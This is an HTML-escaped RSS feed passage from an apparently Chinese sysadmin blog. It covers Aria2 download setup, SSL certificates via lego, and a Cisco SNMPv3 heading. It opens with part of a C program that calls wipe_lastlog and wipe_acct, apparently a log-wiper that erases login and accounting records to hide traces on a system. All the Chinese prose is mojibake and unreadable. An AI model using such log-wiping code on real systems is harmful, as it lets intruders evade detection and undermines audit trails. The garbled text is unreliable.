&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;					&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;						&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;						&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;6&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;wipe_lastlog&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;						&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#ifndef NO_ACCT
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;		&lt;span class=&#34;cm&#34;&gt;/* ACCT */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; &lt;span class=&#34;sc&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;!=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;				&lt;span class=&#34;nf&#34;&gt;usage&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;nf&#34;&gt;wipe_acct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;argv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;			&lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#endif
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Aria2ä¸‹è½½ç½‘å‰§å¹¶æé€Ÿä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜</title>
      <link>https://rendoumi.com/posts/20240124-aria2_baidu/</link>
      <pubDate>Wed, 24 Jan 2024 16:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-aria2_baidu/</guid>
      <description>&lt;p&gt;å—ç“œè§†é¢‘æœ€è¿‘è¢«æ•´æ”¹ï¼Œä¸€æ—¶é™·å…¥ç‰‡è’ã€‚&lt;/p&gt;
&lt;p&gt;å®¶é‡Œçš„ç”µè§†æœºå¥½ä¸å®¹æ˜“ç¦æ­¢å‡çº§ï¼Œèƒ½ç”¨ESæµè§ˆå™¨ï¼ŒæŒ‚ä¸Šç™¾åº¦ç½‘ç›˜ï¼Œçœ‹å­˜åœ¨é‡Œé¢çš„ç”µå½±ã€‚&lt;/p&gt;
&lt;p&gt;ä½†æ˜¯ï¼Œç™¾åº¦ç½‘ç›˜ç°åœ¨åŸºæœ¬æ˜¯ç£åŠ›å’ŒBTéƒ½å¤±æ•ˆäº†ï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½æƒ³ä¸ªåŠæ³•çœ‹æ€ä¹ˆä¸‹è½½å¹¶ä¸Šä¼ åˆ°ç™¾åº¦ç½‘ç›˜äº†ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä¸€aria2ç”¨æ¥ä¸‹è½½btå’Œç£åŠ›æ–‡ä»¶&#34;&gt;ä¸€ã€Aria2ï¼Œç”¨æ¥ä¸‹è½½BTå’Œç£åŠ›æ–‡ä»¶ã€‚&lt;/h4&gt;
&lt;p&gt;å®‰è£…Aria2ï¼Œè¿™ä¸ªéå¸¸ç®€å•ï¼Œå°±ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶å’Œä¸€å †é…ç½®æ–‡ä»¶å°±è¡Œäº†ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/P3TERX/Aria2-Pro-Core/releases/download/1.35.0_2021.02.19/aria2-1.35.0-static-linux-amd64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf aria2-1.35.0-static-linux-amd64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /root/.aria2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /root/.aria2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/aria2.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/clean.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/core
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/script.conf
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/rclone.env
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/upload.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/delete.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/dht.dat
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/dht6.dat
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/move.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://p3terx.github.io/aria2.conf/LICENSE
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch aria2.session
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„è¿™é‡Œæ˜¯rootç”¨æˆ·è¿è¡Œï¼Œå¦‚æœè¦ç”¨å…¶ä»–ç”¨æˆ·ï¼Œä¿®æ”¹/root/.aria2/aria2.confé‡Œé¢çš„/rootå°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå†é€ ä¸ªsystemctlçš„å¯åŠ¨æ§åˆ¶æ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt;EOF&amp;gt;&amp;gt;/etc/systemd/system/aria2.service 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Description=aria2 Service
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;After=network.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Wants=network.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Type=simple
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStart=/root/aria2c --conf-path=/root/.aria2/aria2.conf
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Restart=on-failure
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;# Don&amp;#39;t restart in the case of configuration error
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;RestartPreventExitStatus=23
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl daemon-reload
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl start aria2 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œå¦‚æœæœ‰é˜²ç«å¢™ï¼Œæ³¨æ„æ‰“å¼€ä»¥ä¸‹ä¸‰ä¸ªç«¯å£ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>ç”¨legoæ¥ä»£æ›¿acmeç”³è¯·å…è´¹sslè¯ä¹¦</title>
      <link>https://rendoumi.com/posts/20240124-lego_acme/</link>
      <pubDate>Wed, 24 Jan 2024 16:09:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-lego_acme/</guid>
      <description>&lt;p&gt;amceç”³è¯·è¯ä¹¦å®åœ¨æ˜¯å¤ªçƒ¦äº†ï¼Œå¯¹äºä¸€å°åªæœ‰1cpu 512mçš„vpsæ¥è¯´ï¼Œè£…è¿™ä¸ªä¸œè¥¿ç®€ç›´å°±æ˜¯è´¹æ—¶è´¹åŠ²ã€‚&lt;/p&gt;
&lt;p&gt;å¥½åœ¨æœ‰äººå¹²è„†å¼€å‘äº†ä¸€ä¸ªgoè¯­è¨€çš„å·¥å…·legoï¼Œè¿™ä¸œè¥¿å®Œå…¨èƒ½å¤Ÿæ›¿ä»£æ‰ACME&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;https://github.com/go-acme/lego/ 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åªæœ‰ä¸€ä¸ªæ‰§è¡Œæ–‡ä»¶ï¼Œæç®€ä¸»ä¹‰ï¼š&lt;/p&gt;
&lt;p&gt;ç”³è¯·è¯ä¹¦ä¸€å¥è¯ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; lego --email&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;foo@bar.com&amp;#34;&lt;/span&gt; --domains&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt; --http run 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å›ç­”ä¸€ä¸‹Yes&lt;/p&gt;
&lt;p&gt;ç„¶åç”Ÿæˆçš„è¯ä¹¦éƒ½æ”¾åœ¨.lego/certificates/ç›®å½•ä¸‹&lt;/p&gt;
&lt;p&gt;ç»­è´¹ä¹Ÿæ˜¯ä¸€å¥è¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; lego --email&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;foo@bar.com&amp;#34;&lt;/span&gt; --domains&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;example.com&amp;#34;&lt;/span&gt; --http renew
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åŠå…¶ç®€å•ï¼Œä¹Ÿæ–¹ä¾¿æ¬è¿ã€‚ç”Ÿæˆçš„è¯ä¹¦crtæ˜¯å¸¦è¯ä¹¦é“¾æ¡çš„&lt;/p&gt;
&lt;p&gt;ç”³è¯·å¥½å°±å¯ä»¥è£…trojanäº†ã€‚å®åœ¨æ˜¯æ–¹ä¾¿&lt;/p&gt;
&lt;p&gt;å¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘ä¸Šï¼Œå¯ä»¥å¼€ä¸€ä¸ªé˜¿é‡Œramè´¦å·ï¼Œç„¶åç”¨dnsçš„apiéªŒè¯&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ALICLOUD_ACCESS_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;aaaaaaaa  &lt;span class=&#34;nv&#34;&gt;ALICLOUD_SECRET_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bbbbbbbb &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;./lego --email admin@ddky.com --dns alidns --domains *.ddky.com run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœDNSæ˜¯æ‰˜ç®¡åœ¨namesiloä¸Šï¼ŒåŒæ ·å¯ä»¥å¼€ä¸€ä¸ªapiçš„keyï¼Œæ—¶é—´ä¸€å®šè¦æ”¾é•¿ï¼Œå¦åˆ™ä¸ç”Ÿæ•ˆï¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NAMESILO_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ccccc &lt;span class=&#34;nv&#34;&gt;NAMESILO_PROPAGATION_TIMEOUT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3600&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NAMESILO_POLLING_INTERVAL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;120&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;NAMESILO_TTL&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3600&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;./lego --email zhangranrui@gmail.com --dns namesilo --domains *.rendoumi.com run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Cisco snmpv3çš„è®¾ç½®</title>
      <link>https://rendoumi.com/posts/20240124-cisco_snmp3/</link>
      <pubDate>Wed, 24 Jan 2024 16:08:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240124-cisco_snmp3/</guid>
